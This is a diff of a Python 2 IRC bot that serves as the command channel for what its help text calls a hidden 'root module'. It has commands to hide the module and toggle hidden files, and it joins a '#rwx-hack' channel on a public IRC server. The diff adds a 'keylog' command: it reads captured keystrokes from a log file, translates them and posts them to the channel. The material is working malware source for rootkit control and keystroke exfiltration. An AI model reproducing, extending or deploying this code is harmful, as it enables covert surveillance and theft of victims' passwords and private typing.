@@ -20,6 +20,7 @@ Bot commands are:
     disconnect -- Disconnect the bot. The bot will try to reconnect
                   after 60 seconds.
     die -- Kill the bot.
+    -------dcc -- Command a bot DCC CHAT invite connection.
 
     ROOT COMMANDS -------
 
@@ -29,13 +30,11 @@ Bot commands are:
     thf -- Toggle files show/hide.
     mh -- Hide the root module. 
     ms -- Show the root module.
-
-    -------dcc -- Command a bot DCC CHAT invite connection.
 """
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
-from keymap import keys, cap_keys, cap_shift_keys, shift_keys
+import key
 
 
 server = "chat.freenode.net"
@@ -43,21 +42,21 @@ port = 6667
 channel = "#rwx-hack"
 nickname = "rwx-lkm"
 
-# Debugging Mode -- set to False to remove.
-debugging = True 
+# Debug Mode -- set to False to remove.
+debug = True 
 
-class TestBot(irc.bot.SingleServerIRCBot):
+class Bot(irc.bot.SingleServerIRCBot):
     def __init__(self, channel, nickname, server, port=6667):
-        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
+        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname)
         self.channel = channel
 
     def on_nicknameinuse(self, c, e):
-        if debugging:
+        if debug:
             print "Nickname in use. Modifying to " + c.get_nickname() + "_"
         c.nick(c.get_nickname() + "_")
 
     def on_welcome(self, c, e):
-        if debugging:
+        if debug:
             print "Joining %s" % self.channel
         c.join(self.channel)
 
@@ -71,7 +70,7 @@ class TestBot(irc.bot.SingleServerIRCBot):
         return
 
     def on_dccmsg(self, c, e):
-        if debugging:
+        if debug:
             print "You said: " + e.arguments[0]
 
         c.privmsg("You said: " + e.arguments[0])
@@ -106,7 +105,12 @@ class TestBot(irc.bot.SingleServerIRCBot):
 
     def keylogs(self):
         # Translate the logs and print to console (option to send DCC)
-        pass
+        log = open('evlog.txt')  # CORRECT PATH
+        f = log.read()
+        log.close()
+        kl = key.translate(f)
+        return kl
+
 
     def error_log(self):
         # Print error log to console (better to send DCC)
@@ -117,17 +121,17 @@ class TestBot(irc.bot.SingleServerIRCBot):
         c = self.connection
 
         if "disconnect" == cmd:
-            if debugging:
+            if debug:
                 print "Disconnecting. Will attempt reconnect in 60 seconds..."
 
             self.disconnect()
         elif "die" == cmd:
-            if debugging:
+            if debug:
                 print "Die"
 
             self.die()
         elif "stats" == cmd:
-            if debugging:
+            if debug:
                 print "Retrieving channel stats."
             
             for chname, chobj in self.channels.items():
@@ -143,22 +147,19 @@ class TestBot(irc.bot.SingleServerIRCBot):
                 voiced.sort()
                 c.notice(chname, "Voiced: " + ", ".join(voiced))
 
-            if debugging:
+            if debug:
                 print "--- Channel statistics ---"
                 print "Channel: " + chname
                 print "Users: " + ", ".join(users)
                 print "Opers: " + ", ".join(opers)
                 print "Voiced: " + ", ".join(voiced)
         elif "dcc" == cmd:
-            if debugging:
-                print "DCC"
-            
             dcc = self.dcc_listen()
             c.ctcp("DCC", nick, "CHAT chat %s %d" % (
                 ip_quad_to_numstr(dcc.localaddress),
                 dcc.localport))
 
-            if debugging:
+            if debug:
                 print "DCC", nick, "CHAT chat %s %d" % (
                 ip_quad_to_numstr(dcc.localaddress),
                 dcc.localport)
@@ -166,14 +167,19 @@ class TestBot(irc.bot.SingleServerIRCBot):
             self.root_command(cmd)
             status = self.root_status()
             c.notice(channel, "Command %s executed." % cmd)
-            if debugging:
+            if debug:
                 print "Command %s executed." % cmd
             for line in status:
                 c.notice(channel, line)
-                if debugging:
+                if debug:
                     print "%s" % line
+        elif "keylog" == cmd:
+            for k in self.keylogs():
+                c.notice(channel, k)
+                if debug:
+                    print k
         elif "help" == cmd:
-            if debugging:
+            if debug:
                 print """
 BOT COMMANDS --------
 stats -- Print some channel information.
@@ -202,15 +208,15 @@ ms -- Show the root module.
             c.notice(channel, "mh -- Hide the root module (default).")
             c.notice(channel, "ms -- Show the root module.")
         else:
-            if debugging:
+            if debug:
                 print nick, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname)
            
             c.notice(channel, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname))
 
 def main():
-    bot = TestBot(channel, nickname, server, port)
+    bot = Bot(channel, nickname, server, port)
 
-    if debugging:
+    if debug:
         print "Connecting to %s on port: %d" % (server, port)
     bot.start()
 
